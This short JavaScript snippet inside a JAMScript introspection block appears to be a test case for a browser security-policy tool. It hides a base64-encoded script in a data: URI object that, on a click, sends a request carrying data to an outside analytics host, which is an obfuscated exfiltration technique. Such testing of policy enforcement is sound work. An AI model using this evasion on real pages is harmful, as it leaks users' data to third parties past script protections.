introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  var data$$18 = "PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNCIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=";
  var URL = "data:text/html;charset=utf-7;base64," + data$$18;
  var script = document.createElement("object");
  script.data = URL;
  document.getElementsByTagName("body")[0].appendChild(script)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}
